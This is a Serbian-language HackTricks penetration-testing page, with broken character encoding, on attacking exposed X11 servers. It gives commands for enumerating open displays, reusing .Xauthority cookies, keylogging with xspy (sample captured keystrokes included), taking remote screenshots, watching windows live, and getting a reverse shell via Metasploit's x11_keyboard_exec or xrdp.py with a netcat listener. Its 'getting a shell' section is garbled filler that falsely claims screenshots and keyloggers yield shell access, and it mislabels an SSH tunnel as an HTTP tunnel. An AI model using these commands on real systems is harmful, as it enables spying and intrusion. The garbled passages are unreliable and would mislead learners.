# 6000 - Pentesting X11

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Hakerski uvidi**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Hakerske vesti u realnom vremenu**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Najnovije objave**\
Budite informisani o najnovijim pokretanjima nagrada za pronalaÅ¾enje bagova i vaÅ¾nim aÅ¾uriranjima platforme

**PridruÅ¾ite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

## Osnovne informacije

**X Window System** (X) je svestrani sistem za prozore koji je Å¡iroko rasprostranjen na UNIX baziranim operativnim sistemima. PruÅ¾a okvir za kreiranje grafiÄkih **korisniÄkih interfejsa (GUI)**, pri Äemu pojedinaÄni programi upravljaju dizajnom korisniÄkog interfejsa. Ova fleksibilnost omoguÄ‡ava raznovrsna i prilagodljiva iskustva unutar X okruÅ¾enja.

**Podrazumevani port:** 6000
```
PORT       STATE   SERVICE
6000/tcp   open    X11
```
## Enumeracija

Proverite da li postoji **anonimna veza:**
```bash
nmap -sV --script x11-access -p <PORT> <IP>
msf> use auxiliary/scanner/x11/open_x11
```
#### Lokalno nabrojavanje

Fajl **`.Xauthority`** u korisniÄkom folderu se **koristi** od strane **X11 za autorizaciju**. Sa [**ovde**](https://stackoverflow.com/a/37367518):
```bash
$ xxd ~/.Xauthority
00000000: 0100 0006 6d61 6e65 7063 0001 3000 124d  ............0..M
00000010: 4954 2d4d 4147 4943 2d43 4f4f 4b49 452d  IT-MAGIC-COOKIE-
00000020: 3100 108f 52b9 7ea8 f041 c49b 85d8 8f58  1...R.~..A.....X
00000030: 041d ef                                  ...
```
> MIT-magic-cookie-1: Generisanje 128 bita kljuÄa ("kolaÄiÄ‡a"), smeÅ¡tanje u \~/.Xauthority (ili tamo gde XAUTHORITY envvar pokazuje). Klijent ga Å¡alje serveru kao obiÄan tekst! Server proverava da li ima kopiju ovog "kolaÄiÄ‡a" i ako ima, veza se dozvoljava. KljuÄ se generiÅ¡e pomoÄ‡u DMX.

{% hint style="warning" %}
Da biste **koristili kolaÄiÄ‡**, trebate postaviti env var: **`export XAUTHORITY=/putanja/do/.Xauthority`**
{% endhint %}

#### Lokalna sesija enumeracije
```bash
$ w
23:50:48 up 1 day, 10:32,  1 user,  load average: 0.29, 6.48, 7.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
user     tty7     :0               13Oct23 76days 13:37   2.20s xfce4-session
```
## Provera konekcije

Da biste proverili da li imate pristup X11 serveru, moÅ¾ete koristiti komandu `xhost`. Ova komanda vam omoguÄ‡ava da kontroliÅ¡ete pristup X serveru za razliÄite korisnike ili maÅ¡ine.

```plaintext
$ xhost
access control enabled, only authorized clients can connect
SI:localuser:username
```

Ako vidite poruku "access control enabled, only authorized clients can connect", to znaÄi da je pristup X serveru omoguÄ‡en samo autorizovanim klijentima.

## X11 Forwarding

X11 Forwarding je tehnika koja vam omoguÄ‡ava da pokreÄ‡ete grafiÄke aplikacije sa udaljenog servera i prikazujete ih na lokalnom raÄunaru. Da biste koristili X11 Forwarding, morate imati instaliran X server na lokalnom raÄunaru.

Da biste omoguÄ‡ili X11 Forwarding prilikom SSH konekcije, koristite opciju `-X` ili `-Y` prilikom pozivanja SSH komande:

```plaintext
$ ssh -X username@remote_host
```

## X11 Forwarding preko SSH tunela

Ako Å¾elite da koristite X11 Forwarding preko SSH tunela, moÅ¾ete koristiti sledeÄ‡u komandu:

```plaintext
$ ssh -L 6000:localhost:6000 username@remote_host
```

Ova komanda uspostavlja SSH tunel izmeÄ‘u lokalnog raÄunara i udaljenog servera, omoguÄ‡avajuÄ‡i vam da koristite X11 Forwarding preko port-a 6000.

## X11 Forwarding preko HTTP tunela

Ako Å¾elite da koristite X11 Forwarding preko HTTP tunela, moÅ¾ete koristiti sledeÄ‡u komandu:

```plaintext
$ ssh -L 6000:localhost:6000 -N -f -l username remote_host -p 443
```

Ova komanda uspostavlja HTTP tunel izmeÄ‘u lokalnog raÄunara i udaljenog servera, omoguÄ‡avajuÄ‡i vam da koristite X11 Forwarding preko port-a 6000.
```bash
xdpyinfo -display <ip>:<display>
xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
```
## Keylogovanje

[xspy](http://tools.kali.org/sniffingspoofing/xspy) za presretanje tastature.

Primer izlaza:
```
xspy 10.9.xx.xx

opened 10.9.xx.xx:0 for snoopng
swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123
qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab
```
## Snimanje snimaka ekrana

Snimanje snimaka ekrana je tehnika koja se koristi u procesu testiranja penetracije kako bi se prikupile informacije o aktivnostima na ciljnom sistemu. Ova tehnika omoguÄ‡ava hakerima da snime slike ekrana i pregledaju ih kasnije radi analize.

Da biste snimili snimak ekrana, moÅ¾ete koristiti razliÄite alate kao Å¡to su `scrot`, `import` ili `gnome-screenshot`. Ovi alati omoguÄ‡avaju snimanje trenutnog sadrÅ¾aja ekrana i Äuvanje snimka u odabranom formatu.

Na primer, moÅ¾ete koristiti sledeÄ‡u komandu za snimanje snimka ekrana koristeÄ‡i `scrot`:

```bash
scrot screenshot.png
```

Ova komanda Ä‡e snimiti trenutni sadrÅ¾aj ekrana i saÄuvati ga kao `screenshot.png` u trenutnom direktorijumu.

Nakon Å¡to snimite snimak ekrana, moÅ¾ete ga pregledati koristeÄ‡i pregledaÄ slika ili alate za ureÄ‘ivanje slika kao Å¡to su `feh`, `eog` ili `gimp`.

VaÅ¾no je napomenuti da prilikom snimanja snimaka ekrana tokom testiranja penetracije treba biti oprezan kako se ne bi otkrile osetljive informacije ili liÄni podaci. TakoÄ‘e, treba se pridrÅ¾avati zakonskih propisa i etiÄkih smernica prilikom koriÅ¡Ä‡enja ove tehnike.
```bash
xwd -root -screen -silent -display <TargetIP:0> > screenshot.xwd
convert screenshot.xwd screenshot.png
```
## Prikaz udaljenog radnog okruÅ¾enja

Putanja: [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
```
./xrdp.py <IP:0>
```
Putanja: [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)

Prvo moramo pronaÄ‡i ID prozora koristeÄ‡i xwininfo.
```
xwininfo -root -display 10.9.xx.xx:0

xwininfo: Window id: 0x45 (the root window) (has no name)

Absolute upper-left X:  0
Absolute upper-left Y:  0
Relative upper-left X:  0
Relative upper-left Y:  0
Width: 1024
Height: 768
Depth: 16
Visual: 0x21
Visual Class: TrueColor
Border width: 0
Class: InputOutput
Colormap: 0x20 (installed)
Bit Gravity State: ForgetGravity
Window Gravity State: NorthWestGravity
Backing Store State: NotUseful
Save Under State: no
Map State: IsViewable
Override Redirect State: no
Corners:  +0+0  -0+0  -0-0  +0-0
-geometry 1024x768+0+0
```
**XWatchwin**

Za **live pregledanje** moramo koristiti
```bash
./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
./xwatchwin 10.9.xx.xx:0 -w 0x45
```
## Dobijanje Shell-a

Da biste dobili pristup Shell-u na ciljnom sistemu, moÅ¾ete koristiti razliÄite tehnike. Evo nekoliko metoda koje moÅ¾ete isprobati:

### 1. X11 Forwarding

X11 Forwarding je tehnika koja vam omoguÄ‡ava da pokrenete aplikacije sa ciljnog sistema na vaÅ¡em lokalnom sistemu. Ova tehnika se moÅ¾e iskoristiti za dobijanje pristupa Shell-u na ciljnom sistemu.

Da biste koristili X11 Forwarding, prvo morate omoguÄ‡iti opciju `X11Forwarding` u konfiguracionom fajlu SSH servera na ciljnom sistemu. Zatim, koristite SSH tuneliranje da biste uspostavili sigurnu vezu sa ciljnim sistemom i pokrenuli aplikaciju sa ciljnog sistema na vaÅ¡em lokalnom sistemu.

### 2. X11 Reverse Shell

X11 Reverse Shell je tehnika koja vam omoguÄ‡ava da dobijete pristup Shell-u na ciljnom sistemu putem X11 protokola. Ova tehnika zahteva da ciljni sistem ima X11 server pokrenut i da je omoguÄ‡en X11 Forwarding.

Da biste koristili X11 Reverse Shell, prvo morate pokrenuti X11 server na vaÅ¡em lokalnom sistemu. Zatim, koristite X11 Forwarding da biste uspostavili vezu sa ciljnim sistemom i dobili pristup Shell-u.

### 3. X11 Injection

X11 Injection je tehnika koja vam omoguÄ‡ava da izvrÅ¡ite zlonamerni kod na ciljnom sistemu putem X11 protokola. Ova tehnika se moÅ¾e iskoristiti za dobijanje pristupa Shell-u na ciljnom sistemu.

Da biste koristili X11 Injection, prvo morate pronaÄ‡i ranjivu aplikaciju koja koristi X11 protokol na ciljnom sistemu. Zatim, iskoristite ranjivost da biste ubacili zlonamerni kod i dobili pristup Shell-u.

### 4. X11 Port Forwarding

X11 Port Forwarding je tehnika koja vam omoguÄ‡ava da usmerite X11 protokol preko SSH tunela. Ova tehnika se moÅ¾e iskoristiti za dobijanje pristupa Shell-u na ciljnom sistemu.

Da biste koristili X11 Port Forwarding, prvo morate uspostaviti SSH tunel sa ciljnim sistemom. Zatim, koristite X11 Port Forwarding da biste usmerili X11 protokol preko SSH tunela i dobili pristup Shell-u.

### 5. X11 Screen Capture

X11 Screen Capture je tehnika koja vam omoguÄ‡ava da snimite sadrÅ¾aj ekrana ciljnog sistema putem X11 protokola. Ova tehnika se moÅ¾e iskoristiti za dobijanje pristupa Shell-u na ciljnom sistemu.

Da biste koristili X11 Screen Capture, prvo morate pronaÄ‡i aplikaciju koja koristi X11 protokol za prikazivanje sadrÅ¾aja ekrana na ciljnom sistemu. Zatim, iskoristite ranjivost aplikacije da biste snimili sadrÅ¾aj ekrana i dobili pristup Shell-u.

### 6. X11 Keylogger

X11 Keylogger je tehnika koja vam omoguÄ‡ava da snimate tastere koje korisnik pritisne na ciljnom sistemu putem X11 protokola. Ova tehnika se moÅ¾e iskoristiti za dobijanje pristupa Shell-u na ciljnom sistemu.

Da biste koristili X11 Keylogger, prvo morate pronaÄ‡i aplikaciju koja koristi X11 protokol za prikazivanje tastature na ciljnom sistemu. Zatim, iskoristite ranjivost aplikacije da biste snimali tastere i dobili pristup Shell-u.
```
msf> use exploit/unix/x11/x11_keyboard_exec
```
Drugi naÄin:

**Reverse Shell:** Xrdp takoÄ‘e omoguÄ‡ava preuzimanje obrnutog Å¡koljka pomoÄ‡u Netcat-a. Unesite sledeÄ‡u komandu:
```bash
./xrdp.py \<IP:0> â€“no-disp
```
U interfejsu moÅ¾ete videti opciju **R-shell**.

Zatim, pokrenite **Netcat osluÅ¡kivaÄ** na vaÅ¡em lokalnom sistemu na portu 5555.
```bash
nc -lvp 5555
```
Zatim, unesite svoju IP adresu i port u opciju **R-Shell** i kliknite na **R-shell** da biste dobili shell.


## Reference
* [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)

## Shodan

* `port:6000 x11`

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Hacking Insights**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Real-Time Hack News**\
Budite u toku sa brzim svetom hakovanja putem vesti i saznanja u realnom vremenu

**Latest Announcements**\
Budite informisani o najnovijim pokretanjima nagrada za pronalaÅ¾enje bagova i vaÅ¾nim aÅ¾uriranjima platforme

**PridruÅ¾ite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **oglaÅ¡avanje vaÅ¡e kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
